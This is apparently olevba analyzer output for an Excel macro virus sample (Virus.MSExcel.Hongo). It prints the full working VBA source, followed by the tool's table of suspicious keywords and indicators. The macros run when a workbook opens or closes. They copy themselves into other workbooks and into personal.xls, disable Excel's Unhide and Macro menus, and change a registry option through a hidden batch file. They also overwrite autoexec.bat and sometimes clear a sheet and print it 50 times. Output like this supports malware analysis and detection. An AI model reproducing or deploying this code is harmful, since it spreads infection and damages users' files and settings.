olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Hongo-1829c0737cb5344eb9c6f5c7802966c8e2c7bae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "Diana"
Call Diana
End Sub










Sub Diana()
Attribute Diana.VB_ProcData.VB_Invoke_Func = " \n14"
Randomize
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\cañete.sys"
Call luis
If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:
If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "LIBR" Then GoTo out:
CommandBars("Window").Controls("Unhide...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False
MkDir ((Application.Path) + "\iniciar")
If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True
For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i
If SXLS = False And UCase(Mid(ActiveWorkbook.Name, 1, 4)) <> "LIBR" And UCase(Mid(ActiveWorkbook.Name, 1, 4)) <> "BOOK" Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\cañete.sys")
ActiveWorkbook.Save
End If
If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\cañete.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Workbooks.Add.SaveAs FileName:=(Application.Path) + "\Iniciar\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\cañete.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
End If
If UCase(Dir("c:\sys32.reg")) <> "SYS32.REG" Or UCase(Dir("c:\sys32.bat")) <> "SYS32.BAT" Then
Open "c:\sys32.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\sys32.bat" For Output As 1
Print #1, "regedit /s c:\sys32.reg"
Close 1
End If
out:
On Error Resume Next
Shell "c:\sys32.bat", vbHide
End Sub

Sub luis()
Attribute luis.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Second(Time) = 19 Or Day(Date) = 25 Then
Dim viejo, beldad
viejo = "C:\autoexec.bat": beldad = "C:\beldad.bat"
Name viejo As beldad
Open "c:\autoexec.bat" For Output As 1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "echo *****************************************************************"
Print #1, "echo *                                                               *"
Print #1, "echo *                          D I A N A...                         *"
Print #1, "echo *                          UNA BELDAD                           *"
Print #1, "echo *                          4 TO PISO                            *"
Print #1, "echo *                          CAÑETE - PERU                        *"
Print #1, "echo *                   Tu BelleZa emboba a cualquier ser           *"
Print #1, "echo *                    AutoR: Luis   CACI-I SISE                  *"
Print #1, "echo *****************************************************************"
Print #1, "pause"
Print #1, "beldad.bat"
Close 1
End If
If Int(Rnd * 100) = 19 Then
    Range("A1:I100").Select
    Selection.ClearContents
    With Selection.Interior
        .ColorIndex = 33
        .Pattern = xlSolid
    End With
    Range("E1:E25").Select
    With Selection
        .HorizontalAlignment = xlCenter
    End With
    Range("E15").Select
    ActiveCell.FormulaR1C1 = "D I A N A"
    Selection.Font.ColorIndex = 5
    With Selection.Font
        .Size = 30
    End With
    Range("E16").Select
    ActiveCell.FormulaR1C1 = "UNA BELDAD"
    With Selection.Font
        .Size = 22
    End With
    Range("E17").Select
    ActiveCell.FormulaR1C1 = "Tu Belleza Emboba a cualquier ser"
    Range("E18").Select
    ActiveCell.FormulaR1C1 = "Autor: Luis CACI-I SISE"
    Range("D15:F18").Select
    With Selection.Interior
        .ColorIndex = xlNone
    End With
    Range("A1").Select
ActiveWindow.SelectedSheets.PrintOut Copies:=50
End If
End Sub
Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\cañete.sys"
Shell "c:\sys32.bat", vbHide
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |sys32.reg           |Executable file name                         |
|IOC       |SYS32.REG           |Executable file name                         |
|IOC       |sys32.bat           |Executable file name                         |
|IOC       |SYS32.BAT           |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |beldad.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

